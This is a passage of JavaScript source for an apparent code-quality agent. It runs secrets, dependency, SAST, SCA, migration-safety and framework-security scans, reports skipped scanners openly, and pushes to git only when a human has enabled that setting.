        // file (and never ran deduplicateFindings, discarding already-found secrets) on
        // the first throw, understating coverage loss and reading as a silent pass.
        try {
          scanner.findings.push(...scanner.scanFile(abs));
          scanner.scannedFiles++;
        } catch (fileErr) {
          const loc = path.relative(projectRoot, abs) || abs;
          const msg = `secrets scan skipped file (NOT scanned): ${loc} — ${fileErr.message}`;
          skipped.push(msg);
          console.log(`   ${msg}`);
        }
      }
    }

    const secretFindings = scanner.deduplicateFindings();
    for (const f of secretFindings) {
      bump(f.severity);
      detail.push(`secret[${f.severity}] ${f.name || f.type} at ${f.file}:${f.line}`);
    }
    console.log(secretFindings.length
      ? `   Secrets: ${secretFindings.length} finding(s)`
      : '   Secrets: none');

    // File-level skips the scanner RECORDED (an oversized file past maxFileSize, an
    // unreadable file, or an unreadable directory) are folded into skipped[] so a
    // file that was too large or unreadable to scan is VISIBLE — not a silent clean
    // pass. The gate is unchanged: a skip is not a finding and does NOT block (no
    // severity bump); the summary just stops erasing that N files went unscanned.
    // scanner.errors entries are {file|path|tool, error}; the location is relativized
    // to projectRoot for a legible, host-independent message.
    for (const e of (scanner.errors || [])) {
      const where = e.file || e.path || e.tool || 'unknown';
      const loc = (e.file || e.path)
        ? path.relative(projectRoot, where) || where
        : where;
      const msg = `secrets scan skipped file (NOT scanned): ${loc} — ${e.error}`;
      skipped.push(msg);
      console.log(`   ${msg}`);
    }
  } catch (err) {
    const msg = `secrets scan skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  // 2. DEPENDENCIES — runs when a package-manager audit tool is present.
  try {
    const auditor = new DependencyAuditor(projectRoot);
    const managers = auditor.detectPackageManagers();
    if (managers.length === 0) {
      console.log('   Dependencies: no package manager detected — nothing to audit');
    } else {
      // F-2: let DependencyAuditor decide, don't require the EXACT detected manager's own
      // tool. yarn/pnpm audit through a built-in npm-audit fallback (dependency-auditor's
      // runAudit) — but ONLY when an npm lockfile (package-lock.json/npm-shrinkwrap.json)
      // is present. `npm audit` reads ONLY those files; on a yarn.lock-/pnpm-lock.yaml-only
      // tree it returns {"error":{"code":"ENOLOCK"}} and audits NOTHING (verified against
      // npm 11.x). Claiming the yarn/pnpm manager "runnable" there ran a fallback that
      // audited nothing yet read as a clean pass — the confirmed FALSE-CLEAN. So the
      // fallback is genuine ONLY with an npm lockfile present; without one, the real
      // coverage is the SCA/osv step below (osv reads yarn.lock/pnpm-lock.yaml natively),
      // and yarn/pnpm is a LOUD skip here rather than a fabricated clean audit. A manager
      // is runnable when its own tool is present OR it is a JS manager whose npm fallback
      // can actually read the tree (npm present AND an npm lockfile present).
      const JS_NPM_FALLBACK = new Set(['yarn', 'pnpm']);
      const npmAvailable = auditor.isToolAvailable('npm');
      const npmLockPresent = auditor._hasNpmLockfile();
      const runnable = (m) => auditor.isToolAvailable(m)
        || (JS_NPM_FALLBACK.has(m) && npmAvailable && npmLockPresent);
      const available = managers.filter(runnable);
      const missing = managers.filter(m => !runnable(m));
      for (const m of missing) {
        const msg = `dependency audit skipped: ${m} audit tool not installed`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      if (available.length > 0) {
        const res = await auditor.run();
        for (const v of (res.vulnerabilities || [])) {
          bump(v.severity === 'MODERATE' ? 'MEDIUM' : v.severity);
          detail.push(`dependency[${v.severity}] ${v.package || v.name || 'unknown'}: ${v.title || v.advisory || ''}`.trim());
        }
        // Tool-level errors (e.g. registry unreachable) are loud skips, never
        // silent passes.
        for (const e of (res.errors || [])) {
          const msg = `dependency audit skipped (${e.manager || 'tool'}): ${e.error}`;
          skipped.push(msg);
          console.log(`   ${msg}`);
        }
        console.log(`   Dependencies: ${(res.vulnerabilities || []).length} vulnerability(ies)`);
      }
    }
  } catch (err) {
    const msg = `dependency audit skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  // 3. SAST — runs when a static-analysis scanner is available.
  try {
    const sast = new SASTRunner(projectRoot);
    const languages = sast.detectLanguages();
    if (languages.length === 0) {
      console.log('   SAST: no supported language detected — nothing to scan');
    } else {
      // A language is scannable iff a scanner that can ACTUALLY parse its result is
      // installed — decided by the honest router, not by raw primary-tool presence.
      // securityRouteFor(l).native is a scanner this runner has a parser for (bandit/
      // gosec/eslint) or null; when it is null the only real coverage is the
      // multi-language semgrep universal pass. So a parser-less-tool language (java→
      // spotbugs, rust→cargo-audit, php→psalm, …) is scannable ONLY when semgrep is
      // installed — otherwise its "primary" (e.g. `mvn --version`) being present used
      // to mark it scannable while runLanguageScanner() then scanned it with NOTHING,
      // producing a silent scanned:true. Any unscannable language is a loud skip.
      const semgrep = sast.isToolAvailable('semgrep');
      const scannable = languages.filter(l => {
        const route = sast.securityRouteFor(l);
        return route.native ? sast.isToolAvailable(route.native) : semgrep;
      });
      const unscannable = languages.filter(l => !scannable.includes(l));
      for (const l of unscannable) {
        const tool = TOOL_CONFIGS[l] ? TOOL_CONFIGS[l].primary : 'a scanner';
        const msg = `SAST skipped for ${l}: no scanner installed (need semgrep or ${tool})`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      if (scannable.length > 0) {
        const res = await sast.run();
        // Belt-and-suspenders over the scannable filter above: if the runner itself
        // reports that no scanner actually ran, that is a loud skip, never a pass.
        if (res && res.scanned === false) {
          const msg = `SAST skipped: ${res.reason || 'no scanner ran'}`;
          skipped.push(msg);
          console.log(`   ${msg}`);
        }
        for (const f of (res.findings || [])) {
          bump(f.severity);
          detail.push(`sast[${f.severity}] ${f.rule || f.check || f.title || 'finding'} at ${f.file || '?'}:${f.line || 0}`);
        }
        for (const e of (res.errors || [])) {
          const msg = `SAST skipped (${e.tool || 'tool'}): ${e.error}`;
          skipped.push(msg);
          console.log(`   ${msg}`);
        }
        console.log(`   SAST: ${(res.findings || []).length} finding(s)`);
      }
    }
  } catch (err) {
    const msg = `SAST skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  // 4. SCA — dependency-CVE audit (the composition half of security). Runs when a
  //    parseable SCA scanner is available for a detected language, mirroring the
  //    SAST step's honest routing exactly. osv-scanner is the universal engine; a
  //    language routes to a native parser (npm audit / pip-audit / cargo audit)
  //    only when this runner actually has one, otherwise to osv-scanner. A language
  //    with neither installed is a LOUD per-language skip, never a silent pass.
  try {
    // F2 partition: DependencyAuditor (step 2 above) already audits its covered
    // ecosystems (js/ts, python, go, rust, java, ruby, php). Handing SCA the same
    // languages would count the SAME CVE twice into the human-facing critical/high
    // tally and run the audit twice. SCA is therefore the osv-universal EXTENDER for
    // the long-tail ecosystems ONLY — it defers every DependencyAuditor-covered
    // language. The exclusion set is read from DependencyAuditor, never hardcoded.
    // F1 (coverage hole): deferral must key on what DependencyAuditor GENUINELY
    // audits FOR THIS PROJECT, not the static COVERED_LANGUAGES. The static set marks
    // python "covered" unconditionally (because `pip` is implemented), so a pipenv-
    // only (Pipfile.lock) project — whose detected manager `pipenv` DependencyAuditor
    // does NOT implement — had python deferred here and then hit the languages.length
    // === 0 short-circuit: sca.run() was NEVER called and the Pipfile.lock dependency
    // set was audited by NEITHER runner while the gate returned passed:true.
    // auditedLanguagesFor keys on DETECTED ∩ IMPLEMENTED per project, so an
    // unimplemented-manager ecosystem now flows to a real SCA scan (or an honest
    // scanned:false loud skip), while a genuinely audited ecosystem stays deferred
    // exactly once. sca.run() derives the identical per-project deferral internally,
    // so no excludeLanguages option is passed (the constructor ignores it anyway).
    const sca = new SCARunner(projectRoot);
    const detected = sca.detectLanguages();
    const audited = auditedLanguagesFor(projectRoot);
    const deferred = detected.filter((l) => audited.has(l));
    const languages = detected.filter((l) => !audited.has(l));
    if (deferred.length) {
      console.log(`   SCA: ${deferred.join(', ')} deferred to DependencyAuditor above (no double-count)`);
    }
    if (detected.length === 0) {
      console.log('   SCA: no supported language detected — no dependencies to audit');
    } else {
      // Per-language honesty for the NON-DEFERRED languages: a language whose route has
      // no installed scanner is a LOUD skip. A native-routed language needs its native
      // tool; an osv-routed language needs osv-scanner. Deferred languages are handled by
      // sca.run() internally (and announced in the deferral line above); they are not
      // re-skipped here.
      const osvAvailable = sca.isToolAvailable('osv-scanner');
      const scannable = languages.filter((l) => {
        const route = sca.scaRouteFor(l);
        return route.native ? sca.isToolAvailable(route.native) : osvAvailable;
      });
      const unscannable = languages.filter((l) => !scannable.includes(l));
      for (const l of unscannable) {
        const route = sca.scaRouteFor(l);
        const need = route.native ? `${route.native} or osv-scanner` : 'osv-scanner';
        const msg = `SCA skipped for ${l}: no dependency scanner installed (need ${need})`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      // F-1 (whole-repo net): sca.run() runs whenever ANY dependency manifest exists
      // (detected.length > 0), DECOUPLED from whether a non-deferred language routes to a
      // scanner. sca-runner runs osv-scanner as a WHOLE-REPO net (SCA1) that catches a
      // nested, independently-installed lockfile (packages/api/package-lock.json) that
      // DependencyAuditor (root-only) misses; it dedups deferred ROOT manifests internally
      // (no double-count) and returns an honest scanned:false / clean no-op. The old
      // `else if (languages.length === 0)` short-circuit NEVER called sca.run() for an
      // all-deferred repo, disguising the nested miss as "covered" — a false clean pass.
      const res = await sca.run();
      // Belt-and-suspenders over the scannable filter: if the runner itself reports that
      // no scanner actually ran (a missing scanner, or a crashed sole-osv whole-repo net),
      // that is a loud skip, never a pass.
      if (res && res.scanned === false) {
        const msg = `SCA skipped: ${res.reason || 'no scanner ran'}`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      for (const f of (res.findings || [])) {
        bump(f.severity);
        detail.push(`sca[${f.severity}] ${f.package || 'dependency'}${f.advisory ? ` (${f.advisory})` : ''}: ${f.title || ''}`.trim());
      }
      for (const e of (res.errors || [])) {
        const msg = `SCA skipped (${e.tool || 'tool'}): ${e.error}`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      console.log(`   SCA: ${(res.findings || []).length} dependency finding(s)`);
    }
  } catch (err) {
    const msg = `SCA skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  // 5. MIGRATION SAFETY — destructive-DDL static scan (the databases-dimension
  //    consumer). Mirrors the SCA step's honesty exactly: a repo with NO migrations
  //    is a LOUD informational skip (scanned:false), NEVER a silent clean pass, and a
  //    HIGH destructive finding (DROP TABLE/COLUMN, ALTER…DROP, TRUNCATE, DROP
  //    DATABASE/SCHEMA) bumps the CRITICAL/HIGH gate tally — a migration that drops a
  //    table blocks like any other HIGH. Static core executes nothing (reads + regex).
  try {
    const migration = new MigrationSafetyChecker(projectRoot);
    const res = await migration.run();
    if (res && res.scanned === false) {
      const msg = `migration safety: ${res.reason || 'no migrations detected'} — informational, not a failure`;
      skipped.push(msg);
      console.log(`   ${msg}`);
    } else {
      for (const f of (res.findings || [])) {
        bump(f.severity);
        detail.push(`migration[${f.severity}] ${f.rule || 'destructive DDL'} at ${f.file || '?'}:${f.line || 0}`);
      }
      // Atlas (or file-read) errors are loud skips, never silent passes.
      for (const e of (res.errors || [])) {
        const msg = `migration safety skipped (${e.tool || 'tool'}): ${e.error}`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      console.log(`   Migration safety: ${(res.findings || []).length} destructive finding(s)`);
    }
  } catch (err) {
    const msg = `migration safety skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  // 6. FRAMEWORK SECURITY — client-exposed-secret static scan (the frameworks-
  //    dimension consumer, "concerns → checks"). Mirrors the migration-safety step's
  //    honesty exactly: a repo with NO env-exposure framework is a LOUD informational
  //    skip (scanned:false), NEVER a silent clean pass, and a HIGH client-exposed
  //    secret (a public-prefixed env var whose NAME signals a secret — e.g.
  //    NEXT_PUBLIC_API_SECRET, inlined into the browser bundle) bumps the CRITICAL/
  //    HIGH gate tally: it blocks like any other HIGH. It reads NAMES only and never
  //    inspects or logs a value; executes nothing (reads + regex).
  try {
    const frameworkSec = new FrameworkSecurityChecker(projectRoot);
    const res = await frameworkSec.run();
    if (res && res.scanned === false) {
      const msg = `framework security: ${res.reason || 'no env-exposure framework detected'} — informational, not a failure`;
      skipped.push(msg);
      console.log(`   ${msg}`);
    } else {
      for (const f of (res.findings || [])) {
        bump(f.severity);
        detail.push(`framework-security[${f.severity}] ${f.varName || 'client-exposed secret'} at ${f.file || '?'}:${f.line || 0}`);
      }
      // File-read errors are loud skips, never silent passes.
      for (const e of (res.errors || [])) {
        const msg = `framework security skipped (${e.tool || 'tool'}): ${e.error}`;
        skipped.push(msg);
        console.log(`   ${msg}`);
      }
      console.log(`   Framework security: ${(res.findings || []).length} client-exposed secret(s)`);
    }
  } catch (err) {
    const msg = `framework security skipped (error, NOT a pass): ${err.message}`;
    skipped.push(msg);
    console.log(`   ${msg}`);
  }

  const passed = critical === 0 && high === 0;
  if (skipped.length) {
    console.log(`   Security: ${skipped.length} scanner(s) skipped (see above) — not counted as pass`);
  }
  console.log(passed
    ? `   Security scan clean (${medium} non-blocking finding(s))`
    : `   Security scan FAILED: ${critical} critical, ${high} high`);

  return {
    passed,
    critical,
    high,
    medium,
    details: detail.join('\n'),
    skipped
  };
}

/**
 * Run tiered quality checks
 * Tier 1: BLOCKING (must pass before push)
 * Tier 2: WARNING (should fix, does not block)
 */
async function runTieredChecks(tools) {
  // Tier 1: BLOCKING
  const tier1 = {
    lint: await runLint(tools),
    typecheck: await runTypecheck(tools),
    tests: await runSmartTests(tools),
    security: await runSecurityScan()
  };

  const tier1Passed = Object.values(tier1).every(r => r.passed);
  qualityState.updateTierStatus('tier1', {
    status: tier1Passed ? 'pass' : 'fail',
    checks: tier1
  });

  if (!tier1Passed) {
    return { tier1, tier2: null, allPassed: false, action: 'block' };
  }

  // Tier 2: WARNING (run only if Tier 1 passed)
  // Tier 2 checks are aspirational for v1; start with empty
  const tier2 = {};
  qualityState.updateTierStatus('tier2', {
    status: 'pass',
    checks: tier2
  });

  return { tier1, tier2, allPassed: true, action: 'push' };
}

/**
 * Push to remote.
 *
 * This is the MECHANISM, not the gate. Its only sanctioned automatic caller is
 * {@link maybePushOnSuccess}, which asks the ship gate first. Its other caller is
 * `src/commands/push.js` — the human's own `/ctoc:push`, where the keypress IS the
 * gate decision.
 *
 * R3-C removed the pull-rebase-retry (old "Decision 15"). On a rejected push the
 * agent used to run `git pull --rebase` and push again — a machine rewriting the
 * human's history unattended, in the background, after a commit hook. It now fails
 * LOUDLY and hands the branch back to the human, who decides how to reconcile.
 *
 * @returns {boolean} true iff the push succeeded
 */
function pushToRemote() {
  console.log('\n  Pushing to remote...');

  try {
    runCommand('git push', { silent: false });
    console.log('   Pushed successfully!');
    return true;
  } catch (err) {
    const errMsg = (err.message || err.error || '').toLowerCase();

    if (errMsg.includes('rejected') || errMsg.includes('non-fast-forward') || errMsg.includes('failed to push')) {
      console.log('   PUSH REJECTED: the remote is ahead of your branch.');
      console.log('   CTOC will NOT rebase your history unattended. Reconcile yourself:');
      console.log('     git pull --rebase    (then re-run /ctoc:push)');
      return false;
    }

    console.log('   Push failed:', err.message || err);
    return false;
  }
}

/**
 * THE PUSH SHIP GATE, at the one place the quality agent could ship (R3-C).
 *
 * The agent runs unattended in the background after every commit. Before this
 * function existed it pushed whenever the checks were green and argv said 'push' —
 * and the post-commit hook hardcoded exactly that argv, so a machine crossed the
 * human's ship gate on every green commit. Push is now authorized by ONE key
 * (`git.autoPushEnabled`, default false) and by nothing else: not argv, not an
 * environment variable, not an environment profile.
 *
 * @param {{onSuccess?: string}} args - parsed CLI args (intent)
 * @param {string} [projectPath] - project root (authority is read from here)
 * @returns {{pushed: boolean, reason: string}}
 */
function maybePushOnSuccess(args, projectPath = process.cwd()) {
  if (!args || args.onSuccess !== 'push') {
    return { pushed: false, reason: 'on-success is not push' };
  }

  if (!isAutoPushEnabled(projectPath)) {
    console.log('\n  Checks green. NOT pushing: push is a human ship gate.');
    console.log('   Ship it yourself with /ctoc:push, or opt a machine push in via');
    console.log('   Settings → Git → "Let CTOC push" (git.autoPushEnabled).');
    return {
      pushed: false,
      reason: 'auto-push disabled (ship gate) — the human ships via /ctoc:push'
    };
  }

  const ok = pushToRemote();
  return { pushed: ok, reason: ok ? 'auto-push enabled by the human' : 'push failed' };
}

/**
 * Print summary
 */
function printSummary(results, duration) {
  console.log('\n' + '='.repeat(50));
  console.log('                 QUALITY SUMMARY');
  console.log('='.repeat(50));

  const status = results.allPassed ? 'ALL CHECKS PASSED' : 'CHECKS FAILED';
  console.log(`\n  ${status}`);
  console.log(`  Duration: ${(duration / 1000).toFixed(1)}s\n`);

  const tier1 = results.tier1;
  if (tier1) {
    console.log('  Tier 1 (blocking):');
    console.log('    Lint:      ' + (tier1.lint.passed ? 'PASS' : 'FAIL'));
    console.log('    Typecheck: ' + (tier1.typecheck.passed ? 'PASS' : 'FAIL'));
    console.log('    Tests:     ' + (tier1.tests.passed ? 'PASS' : 'FAIL'));
    // F2 (honesty): the per-scanner console lines above are honest about skips, but
    // the SUMMARY the human acts on erased them — "Security: PASS" read identically
    // whether every scanner ran clean or N scanners never ran (tool absent, or the
    // F1 hole). Surface the skip count so the summary reflects PARTIAL coverage. The
    // gate is unchanged: skips legitimately do not block; the box just stops hiding.
    const securitySkips = Array.isArray(tier1.security.skipped) ? tier1.security.skipped.length : 0;
    const securityStatus = tier1.security.passed ? 'PASS' : 'FAIL';
    console.log('    Security:  ' + securityStatus + (securitySkips
      ? ` (${securitySkips} scanner(s) skipped — see log)`
      : ''));

    if (tier1.tests.passed && tier1.tests.passCount) {
      console.log(`\n  Tests: ${tier1.tests.passCount} passed`);
    }
  }

  if (results.tier2 && Object.keys(results.tier2).length > 0) {
    console.log('\n  Tier 2 (warnings):');
    for (const [name, check] of Object.entries(results.tier2)) {
      console.log(`    ${name}: ${check.passed ? 'PASS' : 'WARN'}`);
    }
  }

  console.log('\n' + '='.repeat(50));
}

/**
 * Main entry point
 */
async function main() {
  const args = parseArgs();
  const startTime = Date.now();

  console.log('\n  CTOC Quality Agent');
  console.log(`   Triggered by: ${args.triggeredBy}`);
  console.log(`   On success: ${args.onSuccess}`);

  // Recover from any interrupted runs
  qualityState.recoverIfNeeded();

  // Try to acquire lock
  if (!qualityState.acquireLock()) {
    console.log('\n  Another quality check is running. Exiting.');
    process.exit(0);
  }

  try {
    // Set running state (now includes gitHead tracking)
    qualityState.setRunning(args.triggeredBy);

    // Detect tools
    console.log('\n  Detecting tools...');
    const detection = toolDetector.detectTools();

    if (detection.languages.length === 0) {
      console.log('   No supported languages detected');
      qualityState.setCompleted(true, {});
      return;
    }

    console.log(`   Languages: ${detection.languages.join(', ')}`);

    // Check for missing tools
    if (detection.missing.length > 0) {
      console.log('\n  Missing tools:');
      for (const m of detection.missing) {
        console.log(`   - ${m.tool}: ${m.install}`);
      }
    }

    // Run tiered checks
    const results = await runTieredChecks(detection.tools);

    const duration = Date.now() - startTime;

    // Build summary for quality state. `runTieredChecks` returns a dynamically
    // shaped result whose per-tool sub-objects checkJs cannot infer — typed `any`.
    const tier1 = /** @type {any} */ (results.tier1 || {});
    qualityState.setCompleted(results.allPassed, {
      tests: tier1.tests || { passed: true, passCount: 0, failed: 0, skipped: 0, flaky: 0 },
      coverage: 0, // TODO: implement coverage
      lint: tier1.lint || { passed: true, errors: 0, warnings: 0 },
      typecheck: tier1.typecheck || { passed: true, errors: 0 },
      security: tier1.security || { passed: true, critical: 0, high: 0, medium: 0 }
    });

    // Print summary
    printSummary(results, duration);

    // Handle success/failure. The push decision is the ship gate's, not argv's.
    if (results.allPassed) {
      maybePushOnSuccess(args, process.cwd());
    } else {
      console.log('\n  Fix the issues above and commit again to retry.');
    }

  } finally {
    qualityState.releaseLock();
  }
}

// Run as a script only when invoked directly (guard the side-effect so that
// `require('./quality-agent')` reuses the check/push blocks WITHOUT starting a
// quality run or a real `git push`). Same proven pattern as the hooks.
if (require.main === module) {
  main().catch(err => {
    console.error('Quality agent error:', err);
    qualityState.releaseLock();
    process.exit(1);
  });
}

// Library surface — reusable check/push building blocks (consumed by
// src/commands/push.js). Exporting these does not change the script path above.
module.exports = {
  parseArgs,
  runCommand,
  runCommandArgv,
  classifySeverity,
  runLint,
  runTypecheck,
  runSpecificTests,
  runSmartTests,
  runFullTests,
  runSecurityScan,
  runTieredChecks,
  pushToRemote,
  maybePushOnSuccess,
  printSummary
};
